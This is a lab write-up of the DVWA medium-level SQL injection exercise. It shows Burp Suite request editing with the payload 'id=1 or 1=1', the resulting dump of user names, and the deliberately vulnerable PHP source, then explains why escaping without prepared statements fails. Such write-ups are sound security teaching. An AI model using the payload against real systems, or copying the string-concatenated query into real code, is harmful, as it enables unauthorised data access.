# SQL Injection - Medium 

---

## Attack Steps 

1. Open burp suite
    - Temporary Project 
    - Use Burp Default

2. Navigate to proxy
    - Set intercept to off 
    - Open browser

3. Set security level to medium 
    - http://localhost/dvwa/security.php

4. Navigate to SQL Injection

5. Turn intercept back on 

6. Choose an ID and submit 

7. Edit the request 
	- Change the id value 
	- From:
	```bash 
	id=1&Submit=Submit
	```
	- To: 
	```bash 
	id=1 or 1=1&Submit=Submit
	```

8. Observe the list of names 
	```html 
	ID: 1 or 1=1
	First name: admin
	Surname: admin

	ID: 1 or 1=1
	First name: Gordon
	Surname: Brown

	ID: 1 or 1=1
	First name: Hack
	Surname: Me

	ID: 1 or 1=1
	First name: Pablo
	Surname: Picasso

	ID: 1 or 1=1
	First name: Bob
	Surname: Smith
	```

---

## Vulnerable Code Analysis

### File:
`C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\medium.php`

#### Code:

```php
<?php

if( isset( $_POST[ 'Submit' ] ) ) {
    // Get input
    $id = $_POST[ 'id' ];

    $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);

    switch ($_DVWA['SQLI_DB']) {
        case MYSQL:
            $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
            $result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );

            // Get results
            while( $row = mysqli_fetch_assoc( $result ) ) {
                // Display values
                $first = $row["first_name"];
                $last  = $row["last_name"];

                // Feedback for end user
                echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
            }
            break;
        case SQLITE:
            global $sqlite_db_connection;

            $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
            #print $query;
            try {
                $results = $sqlite_db_connection->query($query);
            } catch (Exception $e) {
                echo 'Caught exception: ' . $e->getMessage();
                exit();
            }

            if ($results) {
                while ($row = $results->fetchArray()) {
                    // Get values
                    $first = $row["first_name"];
                    $last  = $row["last_name"];

                    // Feedback for end user
                    echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
                }
            } else {
                echo "Error in fetch ".$sqlite_db->lastErrorMsg();
            }
            break;
    }
}

// This is used later on in the index.php page
// Setting it here so we can close the database connection in here like in the rest of the source scripts
$query  = "SELECT COUNT(*) FROM users;";
$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
$number_of_rows = mysqli_fetch_row( $result )[0];

mysqli_close($GLOBALS["___mysqli_ston"]);
?>
```

### Explanation: 
- The code takes direct user input `$id` and attempts basic sanitisation by escaping certain characters 
	```php
	    $id = $_POST[ 'id' ];
    	$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);
	```

- This can be exploited using the payload or 1=1: 
	- Assuming the chosen id was 1
    - The query will become SELECT first_name, last_name FROM users WHERE user_id = 1 or 1=1.
    - The result will always be true
    - Consequently all first and last names will be output.

- Causes: 
    - `mysqli_real_escape_string` only escapes certain characters so SQL keywords or logic operators (OR) are allowed through
    - Direct insertion of user input into queries means queries can be manipulated
    - Not using prepared statements, prepared statements treat user input only as data rather than SQL code so even if SQL keywords are included they won't modify the queries 


